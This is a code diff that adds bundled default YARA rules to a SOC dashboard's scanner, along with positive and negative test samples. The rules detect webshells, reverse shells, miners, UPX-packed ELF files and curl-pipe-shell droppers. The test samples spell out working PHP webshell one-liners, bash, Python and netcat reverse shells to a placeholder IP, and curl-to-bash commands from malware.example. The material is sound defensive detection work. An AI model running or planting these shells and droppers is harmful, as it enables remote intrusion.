@@ -76,12 +76,38 @@ class YaraScanner:
     #  라이프사이클
     # ------------------------------------------------------------------ #
 
+    def _bundle_default_rules(self):
+        """룰 디렉터리가 없거나 비었으면 기본 룰을 깔아둔다.
+
+        이게 없으면 **작업 디렉터리가 저장소 밖일 때 탐지가 통째로 죽는다**
+        (systemd 의 WorkingDirectory 가 다른 경우 등). 실제로 격리 환경에서
+        띄웠더니 "룰 디렉터리 접근 불가" 한 줄만 남기고 조용히 아무것도
+        탐지하지 않았다. 프로젝트 규칙("모든 모듈은 데모 fallback 필수")대로
+        Sigma 와 같은 방식을 쓴다.
+        """
+        try:
+            os.makedirs(self.rules_dir, exist_ok=True)
+            existing = [f for f in os.listdir(self.rules_dir)
+                        if f.endswith((".yar", ".yara"))]
+            if existing:
+                return 0
+            for name, content in BUNDLED_YARA_FILES.items():
+                with open(os.path.join(self.rules_dir, name), "w", encoding="utf-8") as f:
+                    f.write(content.lstrip())
+            _log.info(f"[YARA] 룰이 없어 기본 룰 {len(BUNDLED_YARA_FILES)}개 파일 생성"
+                      f" — {self.rules_dir}")
+            return len(BUNDLED_YARA_FILES)
+        except OSError as e:
+            _log.error(f"[YARA] 기본 룰 생성 실패: {e}")
+            return 0
+
     def start(self, demo=True):
         self.running = True
         if not YARA_OK:
             _log.warning("[YARA] yara-python 미설치 — 파일 내용 기반 탐지 비활성 "
                          "(해시 대조는 그대로 동작)")
             return
+        self._bundle_default_rules()
         self.load_rules()
         _log.info(f"[YARA] 스캐너 시작 — 룰 {self.stats['rules_loaded']}개 "
                   f"· 파일 상한 {self.max_file_mb:g}MB · 타임아웃 {self.timeout}s"
@@ -413,3 +439,249 @@ class YaraScanner:
                          "watch_interval": self.watch_interval,
                          "cache_size": len(self._seen)},
             }
+
+
+# ─────────────────────────────────────────────────────────────────────────
+#  기본 룰 사본 — 룰 디렉터리가 없거나 비었을 때만 쓰인다.
+#
+#  **raw 문자열이어야 한다.** 룰의 정규식에 \n·\s 가 들어 있어 일반 문자열로
+#  담으면 이스케이프가 해석돼 **다른 룰이 된다**(실제로 한 번 그렇게 깨졌다).
+#  손으로 고치지 말고 data/yara/ 를 고친 뒤 다시 생성할 것 —
+#  tests/test_yara_rules.py::test_bundled_rules_match_the_shipped_files 가 강제한다.
+# ─────────────────────────────────────────────────────────────────────────
+BUNDLED_YARA_FILES = {
+    "soc_default.yar": r"""
+/*
+ * SOC 대시보드 기본 YARA 룰
+ *
+ * 해시 대조(hash_checker)는 '알려진 그 파일'만 잡는다 — 한 바이트만 바뀌어도
+ * 놓친다. YARA 는 내용 패턴으로 잡으므로 변종에 강하다. 둘은 대체가 아니라 보완이다.
+ *
+ * meta.mitre 는 커버리지 자가 진단(modules/coverage.py)이 읽는다.
+ * 각 룰의 정탐/오탐 샘플은 data/yara/rule_tests.yml 에 있고 CI 가 검증한다.
+ */
+
+rule SOC_EICAR_Test_File
+{
+    meta:
+        description = "EICAR 표준 안티바이러스 테스트 문자열 (악성 아님, 배선 검증용)"
+        author = "SOC Dashboard"
+        severity = "LOW"
+        mitre = "T1204"
+    strings:
+        $eicar = "EICAR-STANDARD-ANTIVIRUS-TEST-FILE"
+    condition:
+        $eicar
+}
+
+rule SOC_PHP_Webshell
+{
+    meta:
+        description = "PHP 웹셸 — 사용자 입력을 그대로 실행하는 패턴"
+        author = "SOC Dashboard"
+        severity = "CRITICAL"
+        mitre = "T1505"
+    strings:
+        $php  = "<?php"
+        $exec1 = "eval("  nocase
+        $exec2 = "system(" nocase
+        $exec3 = "passthru(" nocase
+        $exec4 = "shell_exec(" nocase
+        $input1 = "$_POST"
+        $input2 = "$_GET"
+        $input3 = "$_REQUEST"
+    condition:
+        $php and any of ($exec*) and any of ($input*)
+}
+
+rule SOC_Reverse_Shell_Script
+{
+    meta:
+        description = "스크립트 형태의 리버스 셸 (bash /dev/tcp · python socket)"
+        author = "SOC Dashboard"
+        severity = "CRITICAL"
+        mitre = "T1059"
+    strings:
+        $bash_tcp   = "/dev/tcp/"
+        $bash_i     = "bash -i"
+        $py_sock    = "socket.socket("
+        $py_dup     = "os.dup2("
+        $py_shell   = "pty.spawn("
+        $nc_e       = "nc -e "
+    condition:
+        ($bash_tcp and $bash_i) or ($py_sock and $py_dup and $py_shell) or $nc_e
+}
+
+rule SOC_Cryptominer_Artifact
+{
+    meta:
+        description = "크립토마이너 바이너리·설정 — 채굴 풀 접속 문자열"
+        author = "SOC Dashboard"
+        severity = "HIGH"
+        mitre = "T1496"
+    strings:
+        $pool1 = "stratum+tcp://"
+        $pool2 = "stratum+ssl://"
+        $pool3 = "minexmr"
+        $pool4 = "supportxmr"
+        $bin1  = "xmrig"
+        $bin2  = "cpuminer"
+    condition:
+        any of ($pool*) or any of ($bin*)
+}
+
+rule SOC_UPX_Packed_ELF
+{
+    meta:
+        description = "UPX 로 패킹된 ELF — 리눅스 악성코드가 흔히 쓰는 난독화"
+        author = "SOC Dashboard"
+        severity = "MEDIUM"
+        mitre = "T1027"
+        // 자동 스캔에서는 제외한다(scope=manual).
+        //
+        // **UPX 패킹 자체는 악성이 아니다.** 정상 소프트웨어도 쓰고, 무엇보다
+        // 패커 도구(/usr/bin/upx-ucl)가 자기 시그니처를 담고 있어 CI 에서
+        // 걸렸다. 패킹된 파일과 패커를 내용만으로 구분하려면 UPX 트레일러
+        // magic 의 위치를 봐야 하는데, 검증할 실제 패킹 샘플이 없어 추측으로
+        // 룰을 조이지 않았다.
+        //
+        // 패킹은 **탐지가 아니라 정황**이다. 분석가가 특정 파일을 지목해
+        // 들여다볼 때(수동 스캔)는 유용하고, 시스템 전체를 훑는 자동 스캔에서는
+        // 소음이다. 그 구분을 여기 적는다.
+        scope = "manual"
+    strings:
+        $upx1 = "UPX!"
+        $upx2 = "$Info: This file is packed with the UPX"
+    condition:
+        uint32(0) == 0x464C457F and any of ($upx*)
+}
+
+rule SOC_Curl_Pipe_Shell_Dropper
+{
+    meta:
+        description = "원격 스크립트를 받아 바로 실행하는 드로퍼"
+        author = "SOC Dashboard"
+        severity = "HIGH"
+        mitre = "T1105"
+        // 오탐을 두 번 줄였다. 둘 다 실측에서 나왔다.
+        //
+        // 1) 처음에는 "curl " 과 "| sh" 를 각각 찾아 AND 로 묶었다. /usr/bin 743개를
+        //    스캔하니 ctest·tailscale 이 걸렸다 — 바이너리 안에 두 문자열이 서로
+        //    멀리 떨어져 있었을 뿐이다. 실제 드로퍼는 **한 명령줄 안에서** 파이프가
+        //    이어지므로 근접성을 조건에 넣었다.
+        // 2) 그래도 CI 러너의 GNU parallel 이 걸렸다. 자기 설치 안내문에
+        //    "wget -O - pi.dk/3 | bash" 가 들어 있다 — 문서에 적힌 명령과 실행되는
+        //    명령을 YARA 가 구분할 수는 없다. 대신 **스킴이 있는 전체 URL**을
+        //    요구했다. 실제 드로퍼는 http(s):// 를 쓰고, 문서의 축약형은 빠진다.
+        //
+        // 알려진 한계: `curl evil.example/x | sh` 처럼 스킴 없이 쓰는 드로퍼는
+        // 놓친다. 자동 스캔이 시스템 전체를 훑는 이상 오탐을 줄이는 쪽을 택했다
+        // — 늑대소년이 되면 사람이 알림을 안 본다.
+    strings:
+        $dropper = /(curl|wget)[^\n\r]{0,200}https?:\/\/[^\n\r]{0,200}\|\s{0,4}(sudo\s+|env\s+)?(ba|z|k|da)?sh\b/
+    condition:
+        $dropper
+}
+""",
+    "rule_tests.yml": r"""
+# YARA 룰의 정탐/오탐 샘플 — CI 가 매 push 마다 검증한다 (detection-as-code).
+#
+# YARA 의 meta 는 스칼라만 담을 수 있어 Sigma 처럼 룰 파일 안에 테스트를 넣지
+# 못한다. 그래서 룰 이름을 키로 하는 이 파일에 둔다.
+#
+# **negative 가 핵심이다.** 오탐은 조용히 쌓이다가 분석가가 알림을 무시하게
+# 만드는 방식으로 탐지 체계를 망가뜨린다. 정상 파일 샘플을 반드시 넣을 것.
+
+SOC_EICAR_Test_File:
+  positive:
+    - name: EICAR 표준 테스트 문자열
+      content: 'X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*'
+  negative:
+    - name: EICAR 를 언급만 하는 문서
+      content: "이 문서는 EICAR 테스트 파일 사용법을 설명합니다."
+
+SOC_PHP_Webshell:
+  positive:
+    - name: 전형적인 eval 웹셸
+      content: "<?php eval($_POST['cmd']); ?>"
+    - name: system + GET 파라미터
+      content: "<?php system($_GET['c']); ?>"
+  negative:
+    - name: 평범한 PHP 출력
+      content: "<?php echo 'hello world'; ?>"
+    - name: eval 을 쓰지만 사용자 입력이 아님
+      content: "<?php eval('$x = 1;'); ?>"
+    - name: PHP 가 아닌 자바스크립트의 eval
+      content: "const f = () => eval(localStorage.getItem('cfg'));"
+
+SOC_Reverse_Shell_Script:
+  positive:
+    - name: bash /dev/tcp 리버스 셸
+      content: "bash -i >& /dev/tcp/203.0.113.10/4444 0>&1"
+    - name: python pty 리버스 셸
+      content: |
+        import socket,os,pty
+        s=socket.socket(); s.connect(("203.0.113.10",4444))
+        os.dup2(s.fileno(),0); pty.spawn("/bin/bash")
+    - name: netcat -e
+      content: "nc -e /bin/sh 203.0.113.10 4444"
+  negative:
+    - name: 평범한 배포 스크립트
+      content: "#!/bin/bash\nset -e\nbash /opt/deploy/release.sh --env prod"
+    - name: 소켓만 쓰는 정상 파이썬 서비스
+      content: |
+        import socket
+        s = socket.socket()
+        s.bind(("0.0.0.0", 8080))
+
+SOC_Cryptominer_Artifact:
+  positive:
+    - name: 채굴 풀 접속 설정
+      content: '{"pools":[{"url":"stratum+tcp://pool.minexmr.com:4444"}]}'
+    - name: xmrig 바이너리 문자열
+      content: "xmrig 6.20.0 built for Linux"
+  negative:
+    - name: 커넥션 풀 설정 (Sigma 쪽에서 오탐이었던 그 패턴)
+      content: 'spring.datasource.hikari.maximum-pool-size=20'
+    - name: 평범한 JSON 설정
+      content: '{"workers": 4, "pool_timeout": 30}'
+
+SOC_UPX_Packed_ELF:
+  positive:
+    - name: UPX 로 패킹된 ELF 헤더
+      content_b64: "f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAAVVBYIQ=="
+  negative:
+    - name: 패킹되지 않은 ELF
+      content_b64: "f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAAAAAAAA=="
+    - name: UPX 를 언급하는 텍스트 (ELF 아님)
+      content: "UPX! 로 패킹된 바이너리는 언패킹 후 분석한다"
+
+SOC_Curl_Pipe_Shell_Dropper:
+  positive:
+    - name: curl 파이프 bash
+      content: "curl -s http://malware.example/x.sh | bash"
+    - name: wget 파이프 sh (공백 없음)
+      content: "wget -qO- http://malware.example/x |sh"
+    - name: sudo 를 끼운 설치 스크립트 형태
+      content: "curl -fsSL https://get.example.com/install.sh | sudo bash"
+    - name: zsh 로 파이프
+      content: "curl http://malware.example/x | zsh"
+  negative:
+    - name: 평범한 헬스체크
+      content: "curl -sf https://api.example.com/health || exit 1"
+    - name: 로컬 스크립트를 셸에 파이프 (다운로드 아님)
+      content: "cat /opt/setup.sh | bash"
+    - name: 받아서 검증만 (파이프 없음)
+      content: "curl -o out.bin http://example.com/f && sha256sum out.bin"
+    # /usr/bin 743개를 실제로 스캔했더니 ctest·tailscale 이 걸렸다 — 바이너리 안에
+    # "curl " 과 "| sh" 가 **서로 멀리 떨어져** 있었을 뿐이다. 자동 스캔을 켜면
+    # 이런 게 매번 알림으로 올라온다. 근접성 조건으로 고쳤고 여기서 고정한다.
+    # CI 러너의 GNU parallel 이 자기 설치 안내문 때문에 걸렸다. 문서에 적힌
+    # 명령과 실행되는 명령을 YARA 는 구분 못 하므로, 스킴 있는 전체 URL 을 요구해
+    # 축약형을 뺐다.
+    - name: 문서에 적힌 축약형 설치 명령 (GNU parallel 실측 오탐이었다)
+      content: "Install: wget -O - pi.dk/3 | bash"
+    - name: 문자열이 흩어진 바이너리 (실측 오탐이었다)
+      content: "curl usage: fetch a URL\n\n....(다른 섹션)....\n\npipe to | sh is unsupported"
+""",
+}
